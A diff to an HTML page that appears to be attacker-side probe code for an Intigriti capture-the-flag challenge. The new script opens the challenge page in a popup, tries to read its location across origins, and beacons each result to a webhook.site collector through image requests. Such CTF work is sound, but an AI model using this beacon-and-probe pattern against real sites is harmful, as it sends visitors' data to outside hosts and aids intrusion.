@@ -1,7 +1,27 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>challenge0326 launcher</title>
+<title>challenge0326 canary</title>
 <body>init</body>
 <script>
-document.body.textContent = 'launcher ok';
+const sink = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
+function ping(msg) {
+  const i = new Image();
+  i.src = sink + '?m=' + encodeURIComponent(msg) + '&t=' + Date.now();
+}
+ping('boot:' + location.href);
+let popup = null;
+try {
+  popup = window.open('https://challenge-0326.intigriti.io/challenge.html?q=test', '_blank');
+  ping('popup-open:' + (!!popup));
+} catch (e) {
+  ping('popup-open-err:' + e);
+}
+setTimeout(() => {
+  try {
+    ping('popup-loc:' + (popup ? String(popup.location) : 'null'));
+  } catch (e) {
+    ping('popup-loc-err:' + e.name + ':' + e.message);
+  }
+  document.body.textContent = 'done';
+}, 2500);
 </script>
